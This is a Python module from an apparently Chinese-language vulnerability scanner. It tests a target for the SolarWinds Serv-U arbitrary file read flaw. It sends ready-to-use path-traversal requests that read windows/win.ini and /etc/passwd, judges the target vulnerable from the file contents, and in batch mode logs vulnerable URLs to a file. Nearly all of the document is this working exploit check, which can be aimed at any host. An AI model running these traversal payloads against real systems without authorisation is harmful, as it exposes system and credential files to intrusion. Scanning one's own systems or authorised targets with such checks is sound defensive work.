#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()


class SolarWinds_File_Read_Scan:
    def get_url(self,input_url):
        try:
            url = input_url + "/?InternalDir=/../../../../windows&InternalFile=win.ini"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if "16-bit" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("SolarWinds", '目标存在SolarWinds Serv-U任意文件读取漏洞')
                    OutPrintInfo("SolarWinds", url)
                else:
                    OutPrintInfoSuc("SolarWinds", f'目标存在SolarWinds Serv-U任意文件读取漏洞: {url}')
                    OutPutFile("SolarWinds_file_read.txt",f'目标存在SolarWinds Serv-U任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SolarWinds", f'目标 {input_url} 不存在SolarWinds Serv-U任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("SolarWinds",'目标请求出错')
            return False
    def get_url2(self,input_url):
        try:
            url = input_url + "/?InternalDir=%5C..%5C..%5C..%5C..%5Cetc&InternalFile=passwd"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl,timeout=self.timeout)
            if "root:x" in req.text:
                if not self.batch:
                    OutPrintInfoSuc("SolarWinds", '目标存在SolarWinds Serv-U任意文件读取漏洞')
                    OutPrintInfo("SolarWinds", url)
                else:
                    OutPrintInfoSuc("SolarWinds", f'目标存在SolarWinds Serv-U任意文件读取漏洞: {url}')
                    OutPutFile("SolarWinds_file_read.txt",f'目标存在SolarWinds Serv-U任意文件读取漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("SolarWinds", f'目标 {input_url} 不存在SolarWinds Serv-U任意文件读取漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("SolarWinds",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("SolarWinds", '开始检测SolarWinds Serv-U任意文件读取漏洞...')
        if self.get_url(url):
            return
        self.get_url2(url)

        if not self.batch:
            OutPrintInfo("SolarWinds", 'SolarWinds Serv-U任意文件读取漏洞检测结束')

